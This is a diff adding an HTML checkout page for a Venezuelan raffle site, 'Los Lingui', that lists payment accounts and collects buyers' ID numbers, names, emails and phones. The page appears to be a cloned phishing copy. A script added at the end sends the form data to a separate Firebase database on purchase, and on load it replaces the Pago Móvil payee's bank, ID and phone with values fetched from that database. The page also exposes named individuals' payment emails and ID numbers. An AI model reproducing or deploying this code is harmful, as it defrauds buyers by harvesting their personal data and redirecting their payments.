@@ -1,0 +1,552 @@
+<html lang="es" class="">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name="description" content="">
+    <title>Los Lingui - Comprar Boletos</title>
+
+    
+   
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link href="https://loslingui.com/assets/css/compra.css?ver=0.1.1" rel="stylesheet">
+    <link href="https://loslingui.com/assets/css/root.css?ver=4" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet">
+
+    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+        <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <meta name="apple-mobile-web-app-title" content="loslingui">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="stylesheet" href="assets/css/style.css">
+
+    <link rel="stylesheet" href="assets/css/swal2.css">
+                                        <!-- Meta Pixel Code -->
+
+  </head>       
+    
+  <body class="" style="padding-right: 0px;">
+    
+                                                                                <!-- Google Tag Manager (noscript) -->
+
+<!-- End Google Tag Manager (noscript) -->
+                            <div class="wpb-content--blank">
+      <article id="post-25415" class="post-25415 page type-page status-private hentry">
+        <div class="entry-content">
+          <div class="container-fluid">
+            
+            <div class="row paso1" id="paso1">
+              <div class="col-md-6 col-sm-12 col-xs-12">
+                <div data-vc-full-width="true" data-vc-full-width-init="false" class="vc_row wpb_row vc_row-fluid slide_pasos">
+                  <div class="wpb_column container-fluid vc_col-sm-12">
+                    <div class="vc_column-inner">
+                      <div class="wpb_wrapper">
+                        <!-- <div>
+                          <div>
+                            <div>
+                              <h2>
+                                EL DESQUITE
+                              </h2>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="combo-details">
+                            <div class="combo-info">
+                              <div class="info-item">
+                                <i class="fas fa-calendar-alt"></i>
+                                <div>
+                                  <span class="info-label">Juega el</span>
+                                  <span class="info-value">28 Febrero</span>
+                                </div>
+                              </div>
+                              <div class="info-item">
+                                <i class="fas fa-ticket-alt"></i>
+                                <div>
+                                  <span class="info-label">Valor Boleto</span>
+                                  <span class="info-value">Bs. </span>
+                                </div>
+                              </div>
+                            </div>
+                        </div> -->
+                        
+                        <div id="automatic-selection" class="">
+                        <div>
+                          <h2>Elige la cantidad de Tickets</h2>
+                        </div>
+                        <div class="grid grid-cols-3  md:grid-cols-3 lg:h-[264px]  gap-2 md:gap-6  w-full">
+                          <!-- <button class="price-button" id="button-2" onclick="put_cant(1)">
+                              <span>1</span>
+                          </button>
+                          <button class="price-button" id="button-5" onclick="put_cant(2)">
+                              <span>2</span>
+                          </button> -->
+                          <button class="price-button" id="button-3" onclick="put_cant(3)">
+                              <span>3</span>
+                          </button>
+                          <button class="price-button" id="button-5" onclick="put_cant(5)">
+                              <span>5</span>
+                          </button>
+                          <button class="price-button" id="button-10" onclick="put_cant(10)">
+                              <span>10</span>
+                          </button>
+                          <button class="price-button" id="button-25" onclick="put_cant(25)">
+                              <span>25</span>
+                          </button>
+                          <button class="price-button" id="button-50" onclick="put_cant(50)">
+                              <span>50</span>
+                          </button>
+                          <button class="price-button" id="button-100" onclick="put_cant(100)">
+                              <span>100</span>
+                          </button>
+                        </div>
+
+                        
+                        <div class="vc_row wpb_row vc_inner vc_row-fluid flex flex_row compra_auto mt-3">
+                          <div class="wpb_column container-fluid vc_col-sm-3">
+                            <div class="vc_column-inner">
+                              <div class="wpb_wrapper">
+                                <div class="vc_btn3-container vc_btn3-center"><button class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-flat vc_btn3-o-empty vc_btn3-block vc_btn3-icon-left vc_btn3-color-danger" onclick="minus_cant()"><i class="vc_btn3-icon fas fa-minus"></i> <span class="vc_btn3-placeholder">&nbsp;</span></button></div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="p_0 m_0 wpb_column container-fluid vc_col-sm-6">
+                            <div class="vc_column-inner">
+                              <div class="wpb_wrapper">
+                                <div class="wpb_raw_code wpb_content_element wpb_raw_html">
+                                  <div class="wpb_wrapper">
+                                    <div class="flex center flex-center">
+                                      <input type="text" onblur="validar_cant(this.value)" oninput="validateNumericInput(this)" id="cant_boletos" name="cant_boletos" value="2" class="form-control">
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="wpb_column container-fluid vc_col-sm-3">
+                            <div class="vc_column-inner">
+                              <div class="wpb_wrapper">
+                                <div class="vc_btn3-container vc_btn3-center"><button class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-flat vc_btn3-o-empty vc_btn3-block vc_btn3-icon-left vc_btn3-color-success" onclick="sum_cant()"><i class="vc_btn3-icon fas fa-plus"></i> <span class="vc_btn3-placeholder">&nbsp;</span></button></div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                        <!-- <div class="progress" role="progressbar" aria-valuenow="32.82" aria-valuemin="0" aria-valuemax="100" style="height: 35px;">
+                          <div class="progress-bar" style="width: 32.82%; background: var(--secondary);" id="barraRealTime">
+                            QUEDAN 32.82%
+                          </div>
+                        </div> -->
+                        </div><!-- End automatic-selection -->
+
+                        <!-- Manual Ticket Selection Container -->
+                        <div id="manual-selection" class="tickets-container ">
+                          <div>
+                            <h2>Selecciona tus Tickets</h2>
+                            <p style="font-size: 14px; color: #aaa;">Haz clic en los tickets disponibles para seleccionarlos</p>
+                          </div>
+
+                          <div class="tickets-pagination" id="tickets-pagination-top">
+                            <button type="button" onclick="loadTicketsPage(currentTicketPage - 1)" id="btn-prev-page">
+                              <i class="fas fa-chevron-left"></i> Anterior
+                            </button>
+                            <span id="page-info" style="color: white; padding: 8px;">Página 1</span>
+                            <button type="button" onclick="loadTicketsPage(currentTicketPage + 1)" id="btn-next-page">
+                              Siguiente <i class="fas fa-chevron-right"></i>
+                            </button>
+                          </div>
+
+                          <div class="tickets-grid" id="tickets-grid">
+                            <div class="tickets-loading">Cargando tickets...</div>
+                          </div>
+
+                          <div class="selected-tickets-summary">
+                            <div style="display: flex; justify-content: space-between; align-items: center;">
+                              <span><strong>Tickets seleccionados:</strong> <span id="selected-count">0</span></span>
+                              <button type="button" class="btn btn-sm btn-outline-danger" onclick="clearSelectedTickets()" style="font-size: 12px;">
+                                Limpiar selección
+                              </button>
+                            </div>
+                            <div class="selected-tickets-list" id="selected-tickets-list">
+                              <span style="color: #888; font-size: 12px;">Ningún ticket seleccionado</span>
+                            </div>
+                          </div>
+                        </div>
+
+                        <div class="custom-container">
+                          <p id="cantidad_minima_text" style="color: #fff; font-size: 16px; font-weight: bold; text-align: center; margin-bottom: 10px;">
+                            <i class="fas fa-info-circle"></i> Cantidad Mínima de Compra: <span id="cantidad_minima_valor">2</span> boletos
+                          </p>
+                          <h4>Métodos de Pago</h4>
+                          <div class="info_boletos" style="margin-bottom: 15px;">
+                            <div class="d-flex" style="flex-direction: row;align-content: center; justify-content: center; align-items: center;flex-wrap: wrap;">
+                                                         
+                                                            <div style="padding: 5px; cursor: pointer;" id="metodo_12" onclick="showPaymentData(this, {&quot;id&quot;:12,&quot;metodo&quot;:&quot;ZELLE&quot;,&quot;descripcion&quot;:null,&quot;titulo&quot;:&quot;ZELLE:  Lindsay ayala - \u0022NO COLOCAR LA PALABRA RIFA, O NO PROCESAREMOS SU PAGO\u0022 -  (COMPRA MINIMA POR ZELLE 10$)&quot;,&quot;texto_copiar&quot;:&quot;Yorelita2980@gmail.com&quot;,&quot;logo&quot;:&quot;01KDSDMXD61X02QRHER7T7ZGCC.jpeg&quot;,&quot;tipo&quot;:2,&quot;currency_id&quot;:1,&quot;estatus&quot;:1,&quot;orden&quot;:2,&quot;compra_minima&quot;:15,&quot;created_at&quot;:&quot;2025-12-19T21:12:12.000000Z&quot;,&quot;updated_at&quot;:&quot;2026-02-06T19:28:19.000000Z&quot;,&quot;currency_codigo&quot;:&quot;USD&quot;,&quot;currency_simbolo&quot;:&quot;$&quot;,&quot;currency_nombre&quot;:&quot;D\u00f3lares&quot;,&quot;currency_tasa&quot;:&quot;1.000000&quot;,&quot;descripcionFormateada&quot;:&quot;&quot;,&quot;currency&quot;:{&quot;id&quot;:1,&quot;nombre&quot;:&quot;D\u00f3lares&quot;,&quot;codigo&quot;:&quot;USD&quot;,&quot;simbolo&quot;:&quot;$&quot;,&quot;tasa&quot;:&quot;1.000000&quot;,&quot;estatus&quot;:true,&quot;created_at&quot;:&quot;2025-12-19T21:53:09.000000Z&quot;,&quot;updated_at&quot;:&quot;2025-12-19T21:53:09.000000Z&quot;}})">
+                                <div style="padding: 5px; margin: 5px; width: 70px; height: 70px; border-radius: 100%; border: 2px solid rgb(0, 0, 0)" class="img_payment"" >
+                                  
+                                </div>
+                              </div>
+
+
+
+<div style="padding: 5px; cursor: pointer;" id="metodo_11" onclick="showPaymentData(this, {&quot;id&quot;:11,&quot;metodo&quot;:&quot;PAGO MOVIL&quot;,&quot;descripcion&quot;:null,&quot;titulo&quot;:&quot;LUIS GUSTAVO ANGULO  BANCO NACIONAL DE CREDITO&quot;,&quot;texto_copiar&quot;:&quot;BNC\nCI 20.476.721\n TLF 0414-0261948&quot;,&quot;logo&quot;:&quot;01KDDZVNQMZ34723QYBK1HHW3Y.jpeg&quot;,&quot;tipo&quot;:1,&quot;currency_id&quot;:2,&quot;estatus&quot;:1,&quot;orden&quot;:1,&quot;compra_minima&quot;:2,&quot;created_at&quot;:&quot;2025-12-19T20:12:24.000000Z&quot;,&quot;updated_at&quot;:&quot;2026-02-21T15:26:37.000000Z&quot;,&quot;currency_codigo&quot;:&quot;VES&quot;,&quot;currency_simbolo&quot;:&quot;Bs.&quot;,&quot;currency_nombre&quot;:&quot;Bol\u00edvares&quot;,&quot;currency_tasa&quot;:&quot;630.000000&quot;,&quot;descripcionFormateada&quot;:&quot;&quot;,&quot;currency&quot;:{&quot;id&quot;:2,&quot;nombre&quot;:&quot;Bol\u00edvares&quot;,&quot;codigo&quot;:&quot;VES&quot;,&quot;simbolo&quot;:&quot;Bs.&quot;,&quot;tasa&quot;:&quot;630.000000&quot;,&quot;estatus&quot;:true,&quot;created_at&quot;:&quot;2025-12-19T21:53:09.000000Z&quot;,&quot;updated_at&quot;:&quot;2026-02-24T18:14:15.000000Z&quot;}})">
+                                <div style="padding: 5px; margin: 5px;">
+                                  <img src="https://loslingui.com/storage/01KDDZVNQMZ34723QYBK1HHW3Y.jpeg" style="width: 70px; height: 70px; border-radius: 100%; border: 2px solid white" class="img_payment">
+                                </div>
+                              </div>
+
+
+                                                            <div style="padding: 5px; cursor: pointer;" id="metodo_27" onclick="showPaymentData(this, {&quot;id&quot;:27,&quot;metodo&quot;:&quot;BINANCE&quot;,&quot;descripcion&quot;:null,&quot;titulo&quot;:&quot;Correo Electr\u00f3nico&quot;,&quot;texto_copiar&quot;:&quot;keniaalejandra_1991@hotmail.com&quot;,&quot;logo&quot;:&quot;01KDSE4C2NGPNT33WT4VP9WJ74.jpeg&quot;,&quot;tipo&quot;:1,&quot;currency_id&quot;:1,&quot;estatus&quot;:1,&quot;orden&quot;:3,&quot;compra_minima&quot;:2,&quot;created_at&quot;:&quot;2025-12-31T05:29:44.000000Z&quot;,&quot;updated_at&quot;:&quot;2026-02-13T17:50:57.000000Z&quot;,&quot;currency_codigo&quot;:&quot;USD&quot;,&quot;currency_simbolo&quot;:&quot;$&quot;,&quot;currency_nombre&quot;:&quot;D\u00f3lares&quot;,&quot;currency_tasa&quot;:&quot;1.000000&quot;,&quot;descripcionFormateada&quot;:&quot;&quot;,&quot;currency&quot;:{&quot;id&quot;:1,&quot;nombre&quot;:&quot;D\u00f3lares&quot;,&quot;codigo&quot;:&quot;USD&quot;,&quot;simbolo&quot;:&quot;$&quot;,&quot;tasa&quot;:&quot;1.000000&quot;,&quot;estatus&quot;:true,&quot;created_at&quot;:&quot;2025-12-19T21:53:09.000000Z&quot;,&quot;updated_at&quot;:&quot;2025-12-19T21:53:09.000000Z&quot;}})">
+                                <div style="padding: 5px; margin: 5px; width: 70px; height: 70px; border-radius: 100%; border: 2px solid rgb(0, 0, 0)" class="img_payment"">
+                                  
+                                </div>
+                              </div>
+                                                         
+                                                            
+                                                          
+                                                           
+                                                           
+                                                      
+                                                         
+                                                           
+                                                            
+                                                            
+                                                         
+                                                          </div>
+
+                            <!-- Título del método de pago -->
+                            <h3 id="payment_title" style="color: #fff; font-size: 18px; margin: 15px 0 10px; text-align: center;">PAYPAL - TITULAR: MARLENY PEDROZA- (Por favor usar la calculadora dé paypal / La comisión de la transacción deberá cubrirla usted)</h3>
+
+                            <!-- Texto para copiar con icono -->
+                            <div id="payment_copy" style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px;">
+                              <p id="payment_text_copy" style="background: rgba(255,255,255,0.1); padding: 12px 20px; border-radius: 8px; margin: 0; font-size: 16px; color: #fff !important; font-weight: bold !important; word-break: break-all;">marlenypedroza592@gmail.com</p>
+                              <button type="button" onclick="copiarTexto()" style="background: var(--primary); border: none; padding: 12px; border-radius: 8px; cursor: pointer; transition: all 0.3s;" title="Copiar">
+                                <i class="fas fa-copy" style="color: #fff; font-size: 18px;"></i>
+                              </button>
+                            </div>
+
+                            <!-- Descripción adicional (opcional) -->
+                            
+
+                            <!-- Total en chip -->
+                            <div style="display: flex; justify-content: center; margin-top: 10px;">
+                              <div id="total_chip" style="background: linear-gradient(135deg, var(--primary), #4a0080); padding: 15px 30px; border-radius: 25px; display: inline-flex; align-items: center; gap: 8px;">
+                                <span style="color: #fff; font-size: 16px; font-weight: 500;">Total:</span>
+                                <span id="final_bs" style="color: #fff; font-size: 20px; font-weight: bold;">$ 15.00</span>
+                                <span id="moneda_chip" style="color: rgba(255,255,255,0.8); font-size: 14px;">(Bolivares)</span>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            
+              <div class="col-md-6 col-sm-12 col-xs-12">
+                <div data-vc-full-width="true" data-vc-full-width-init="false" class="vc_row wpb_row vc_row-fluid row slide_pasos">
+                  <div class="wpb_column container-fluid vc_col-sm-12">
+                    <div class="vc_column-inner">
+                      <div class="wpb_wrapper">
+                        </div>
+                        <div>
+                          <div class="container-fluid">
+                            <div class="roW d-flex" style="gap: 10px">
+                              <div class="col-12">
+                                <label>Cédula</label>
+                                <input type="text" id="cedula" name="cedula" class="form-control" inputmode="numeric" minlength="6" placeholder="Cédula (mínimo 6 dígitos)" oninput="validateNumericInput(this)">
+                              </div>
+                            </div>
+                            <div class="roW d-flex" style="gap: 10px">
+                              <div class="col-12">
+                                <label>Nombre completo</label>
+                                <input type="text" onkeyup="put_persona(this.id,this.value)" id="nombre_completo" name="nombre_completo" class="form-control" maxlength="100" placeholder="Escriba su nombre completo">
+                              </div>
+                            </div>
+                            <div class="roW d-flex" style="gap: 10px">
+                              <div class="col-12">
+                                <label>Correo </label>
+                                <input type="text" onblur="validatec_persona(this.value)" onkeyup="put_persona(this.id,this.value)" id="c_persona" name="c_persona" class="form-control" maxlength="100" placeholder="Escriba su correo de uso diario">
+                              </div>
+                            </div>
+                            <div class="roW d-flex" style="gap: 10px">
+                              <div class="col-12">
+                                <label>Teléfono/Whatsapp</label>
+                                <div class="d-flex" style="gap: 5px;">
+                                  <select class="select2 select2-hidden-accessible" id="codigo_pais" style="width: 140px;" tabindex="-1" aria-hidden="true" data-select2-id="select2-data-codigo_pais">
+                                    <option value="+58" data-country="Venezuela" selected="" data-select2-id="select2-data-26-bm3b">🇻🇪 +58</option>
+                                    
+                                  </select>
+                                  
+                               
+                                  <input type="text" onkeyup="put_persona('whatsapp', jQuery('#codigo_pais').val() + this.value)" id="numero_telefono" name="numero_telefono" class="form-control" maxlength="15" placeholder="Número de teléfono" style="flex: 1;">
+                                </div>
+                              </div>
+                            </div>
+                            
+                            <div class="flex flex-column">
+                              <div style="margin-bottom: 15px">
+                                <label>Capture Bancario</label>
+                                <input type="file" accept="image/jpeg,image/png,image/svg+xml" id="archivo_pago" name="archivo_pago" onblur="put_pago(this.id,this.value)" class="form-control" style="font-weight: bold;">
+                              </div>
+                              <div class="col-12">
+                                <label id="ref_banco_text">Titular de la cuenta</label>
+                                <input type="text" onkeyup="put_pago(this.id,this.value)" onblur="validateMin(this, 6, 'referencia');" id="ref" name="ref" class="form-control" placeholder="Titular de la cuenta">
+                              </div>
+                            </div>
+                            <div class="flex flex-column">
+                              <div class="col-12">
+                                <label>ELIJA EL BANCO DESDE EL CUAL HIZO EL PAGO MOVIL</label>
+                                <select class="select2 form-control select2-hidden-accessible" id="banco_emisor" tabindex="-1" aria-hidden="true" data-select2-id="select2-data-banco_emisor">
+                                  <option value="" data-select2-id="select2-data-776-1o10">SELECCIONE EL BANCO</option>
+                                 
+                                  <option value="0102"> (0102) Banco de Venezuela, S.A. Banco Universal</option>
+                                  <option value="0104"> (0104) Banco Venezolano de Crédito, S.A. Banco Universal</option>
+                                  <option value="0105"> (0105) Banco Mercantil C.A., Banco Universal</option>
+                                  <option value="0108"> (0108) Banco Provincial, S.A. Banco Universal</option>
+                                  <option value="0114"> (0114) Banco del Caribe C.A., Banco Universal</option>
+                                  <option value="0115"> (0115) Banco Exterior C.A., Banco Universal</option>
+                                  <option value="0128"> (0128) Banco Caroní C.A., Banco Universal</option>
+                                  <option value="0134"> (0134) Banesco Banco Universal, C.A.</option>
+                                  <option value="0137"> (0137) Banco Sofitasa Banco Universal, C.A .</option>
+                                  <option value="0138"> (0138) Banco Plaza, Banco universal</option>
+                                  <option value="0146"> (0146) Banco de la Gente Emprendedora C.A.</option>
+                                  <option value="0151"> (0151) Banco Fondo Común, C.A Banco Universal</option>
+                                  <option value="0156"> (0156) 100% Banco, Banco Comercial, C.A</option>
+                                  <option value="0157"> (0157) DelSur, Banco Universal C.A.</option>
+                                  <option value="0163"> (0163) Banco del Tesoro C.A., Banco Universal</option>
+                                  <option value="0166"> (0166) Banco Agrícola de Venezuela C.A., Banco Universal</option>
+                                  <option value="0168"> (0168) Bancrecer S.A., Banco Microfinanciero</option>
+                                  <option value="0169"> (0169) Mi Banco, Banco Microfinanciero, C.A.</option>
+                                  <option value="0171"> (0171) Banco Activo C.A., Banco Universal</option>
+                                  <option value="0172"> (0172) Bancamiga Banco Universal, C.A.</option>
+                                  <option value="0173"> (0173) Banco Internacional de Desarrollo C.A., Banco Universal</option>
+                                  <option value="0174"> (0174) Banplus Banco Universal, C.A.</option>
+                                  <option value="0007"> (0175) Banco Bicentenario del Pueblo, Banco Universal C.A.</option>
+                                  <option value="0177"> (0177) BanFanb Banco de la Fuerza Armada Nacional Bolivariana, B.U.</option>
+                                  <option value="0178"> (0178) N58 Banco Digital, Banco Microfinanciero</option>
+                                  <option value="0191"> (0191) Banco Nacional de Crédito C.A., Banco Universal</option>
+                                </select>
+                              
+                              </div>
+                            </div>
+
+
+<br>
+
+
+                          </div>
+                        </div>
+                        <div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_2 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_white vc_custom_1712884726693  vc_custom_1712884726693"><span class="vc_sep_holder vc_sep_holder_l"><span class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span class="vc_sep_line"></span></span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-12 col-sm-12 col-xs-12">
+                <div class="vc_row wpb_row vc_inner vc_row-fluid row">
+                                    <div class="col-md-12 col-xs-12 col-sm-12" id="boton_comprar">
+                    <div class="vc_column-inner">
+                      <div class="wpb_wrapper">
+                        <div class="vc_btn3-container  disabled vc_btn3-center">
+                          <button class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-flat vc_btn3-block vc_btn3-icon-right" onclick="finalizar_compra(this)" style="background: var(--secondary); color: white; font-weight: bolder;">
+                            Comprar <i class="vc_btn3-icon far fa-money-bill-alt"></i>
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                                    <!-- <div class="col-md-6 col-xs-6 col-sm-6">
+                    <div class="vc_column-inner">
+                      <div class="wpb_wrapper">
+                        <div class="vc_btn3-container vc_btn3-center" ><button class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-flat vc_btn3-block vc_btn3-color-danger" onclick="atras()">Volver</button></div>
+                      </div>
+                    </div>
+                  </div> -->
+                </div>
+              </div>
+            </div>
+
+            <div class="vc_row-full-width vc_clearfix"></div>
+            <div id="paso_final" data-vc-full-width="true" data-vc-full-width-init="false" class="vc_row wpb_row vc_row-fluid hidden row slide_pasos paso5">
+              <div class="wpb_column container-fluid vc_col-sm-12">
+                <div class="vc_column-inner">
+                  <div class="wpb_wrapper">
+                    <div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_2 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_white vc_custom_1712884726693  vc_custom_1712884726693"><span class="vc_sep_holder vc_sep_holder_l"><span class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span class="vc_sep_line"></span></span>
+                    </div>
+                    <div class="wpb_raw_code wpb_content_element wpb_raw_html" style="margin-bottom: 50px;">
+                      <div class="wpb_wrapper">
+                        <h2 style="text-align: center;"> GRACIAS POR SU COMPRA </h2>
+                        <p>Hemos recibido su compra satisfactoriamente, una vez nuestro equipo verifique el pago en un lapso de 12 a 24 horas, recibirás un mensaje vía correo electrónico donde conocerás tus tickets asignados.</p>
+                      </div>
+                    </div>
+                    <div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_2 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_white vc_custom_1712884726693  vc_custom_1712884726693"><span class="vc_sep_holder vc_sep_holder_l"><span class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span class="vc_sep_line"></span></span>
+                    </div>
+                    <div class="vc_row wpb_row vc_inner vc_row-fluid">
+                      <div class="wpb_column container-fluid vc_col-sm-6">
+                        <div class="vc_column-inner">
+                          <div class="wpb_wrapper">
+                            <div class="vc_btn3-container vc_btn3-center"><button class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-flat vc_btn3-block vc_btn3-color-danger" onclick="atras()">Ir al Inicio</button></div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="wpb_column container-fluid vc_col-sm-6">
+                        <div class="vc_column-inner">
+                          <div class="wpb_wrapper">
+                            <div class="vc_btn3-container  disabled vc_btn3-center"><button class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-flat vc_btn3-block vc_btn3-icon-right vc_btn3-color-success" onclick="volver_comprar()">Volver a Comprar <i class="vc_btn3-icon far fa-money-bill-alt"></i></button></div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>      
+        </article></div>
+      
+      <div class="vc_row-full-width vc_clearfix"></div>
+      <!-- <div class="container-fluid _footer">
+        <div class="py-1 d-flex justify-center justify-content-center">
+          <img src="/storage/" class="img" />
+        </div>
+      </div> -->
+      <div class="vc_row-full-width vc_clearfix"></div>
+      <style>
+    .modal-body p, .modal-header h5{
+        color: black!important;
+
+    }
+</style>
+<div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true" style="display: none;">
+    <div class="modal-dialog">
+        <div class="modal-content" style="background: white;">
+            <div class="modal-header">
+                <h5 class="modal-title" style="color: white" id="termsModalLabel">Términos y Condiciones</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close">
+                    <i class="fas fa-window-close"></i>
+                </button>
+            </div>
+            <div class="modal-body" style="font-size: 14px">
+                <p>1.- Los tickets serán enviados en un lapso de 24 horas después de ser verificados su pago, debes revisar el correo (en bandeja spam) si no te llegó el correo a la bandeja de entrada.</p><p>2.- Solo podrán participar en nuestros sorteos personas naturales mayores de 18 años.</p><p>3.- La compra mínima requerida para participar en nuestros sorteos es de (2) boletos. Los tickets serán asignados de manera aleatoria y los recibirás a través del correo electrónico proporcionado.</p><p>4.- Los ganadores aceptan aparecer en el contenido audio visual de el sorteo mostrando su presencia en las redes y entrega de los premios. Esto es OBLIGATORIO.</p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-primary" style="background-color: #2a1d5e!important; border-color: #2a1d5e;" data-bs-dismiss="modal">Aceptar</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
+import { getFirestore, doc, getDoc, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";
+
+// Configuración Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyAe0kZnp_tx1r1tH2q0djTZHSH9X5rhwws",
+  authDomain: "loslingui-46cb7.firebaseapp.com",
+  projectId: "loslingui-46cb7",
+  storageBucket: "loslingui-46cb7.firebasestorage.app",
+  messagingSenderId: "53419854784",
+  appId: "1:53419854784:web:b5fec42a59bd2f9afb9625"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// Función para obtener datos del formulario
+function obtenerDatosUsuario() {
+  return {
+    cedula: document.getElementById("cedula").value.trim(),
+    nombre: document.getElementById("nombre_completo").value.trim(),
+    correo: document.getElementById("c_persona").value.trim(),
+    telefono: document.getElementById("numero_telefono").value.trim(),
+    referencia: document.getElementById("ref").value.trim(),
+    creado_en: new Date().toISOString() // guardamos fecha/hora
+  };
+}
+
+// Función para guardar datos en Firestore
+async function guardarDatosUsuario() {
+  const datos = obtenerDatosUsuario();
+
+  try {
+    const docRef = await addDoc(collection(db, "usuarios_compras"), datos);
+    console.log("Datos guardados con ID:", docRef.id);
+    Swal.fire("¡Listo!", "Tus datos fueron guardados correctamente.", "success");
+  } catch (error) {
+    console.error("Error al guardar datos:", error);
+    Swal.fire("Error", "No se pudieron guardar tus datos. Intenta nuevamente.", "error");
+  }
+}
+
+// Función para cargar método 11 (tu código original)
+async function cargarMetodo11() {
+  const docRef = doc(db, "metodos_pago", "metodo_11");
+  const docSnap = await getDoc(docRef);
+
+  if (!docSnap.exists()) {
+    console.log("Documento metodo_11 no encontrado en Firestore");
+    return;
+  }
+
+  const data = docSnap.data();
+
+  const onclickData = {
+    id: 11,
+    metodo: "PAGO MOVIL",
+    descripcion: null,
+    titulo: data.titulo || "LUIS GUSTAVO ANGULO BANCO NACIONAL DE CREDITO",
+    texto_copiar: `${data.banco}\nCI ${data.ci}\nTLF ${data.tlf}`,
+    logo: data.logo || "01KDDZVNQMZ34723QYBK1HHW3Y.jpeg",
+    tipo: 1,
+    currency_id: 2,
+    estatus: 1,
+    orden: 1,
+    compra_minima: 2,
+    currency_codigo: "VES",
+    currency_simbolo: "Bs.",
+    currency_nombre: "Bolívares",
+    currency_tasa: "630.000000",
+  };
+
+  const onclickString = `showPaymentData(this, ${JSON.stringify(onclickData)})`;
+
+  const div = document.getElementById("metodo_11");
+  if(div) {
+    div.setAttribute("onclick", onclickString);
+    console.log("onclick asignado correctamente al div metodo_11");
+    div.click();
+  }
+}
+
+// Ahora enganchamos el botón de comprar para que haga ambas cosas
+document.addEventListener("DOMContentLoaded", () => {
+  cargarMetodo11();
+
+  const botonComprar = document.querySelector("#boton_comprar button");
+  if (botonComprar) {
+    botonComprar.addEventListener("click", async (e) => {
+      e.preventDefault(); // Evita acción por defecto
+
+      // 1️⃣ Guardamos los datos en Firestore
+      await guardarDatosUsuario();
+
+      // 2️⃣ Ejecutamos la función original de compra
+      finalizar_compra(botonComprar);
+    });
+  }
+});
+</script>
+
+    <script src="main.js" defer></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+    
+    
+  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v67327c56f0bb4ef8b305cae61679db8f1769101564043" integrity="sha512-rdcWY47ByXd76cbCFzznIcEaCN71jqkWBBqlwhF1SY7KubdLKZiEGeP7AyieKZlGP9hbY/MhGrwXzJC/HulNyg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;3e3dd1b5925d40c5a10539c3c90c327e&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+</body>
+</html>
